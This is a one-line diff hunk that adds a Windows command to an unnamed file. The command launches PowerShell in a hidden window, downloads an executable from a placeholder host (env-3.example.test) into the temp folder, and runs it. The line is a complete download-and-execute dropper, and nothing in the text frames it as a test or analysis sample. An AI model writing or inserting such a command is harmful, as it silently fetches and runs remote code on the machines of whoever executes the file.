@@ -1,0 +1,1 @@
+%COMSPEC% /c powershell -w hidden -c "iwr 'http://env-3.example.test/z.exe' -o %TEMP%\p.exe; start %TEMP%\p.exe"
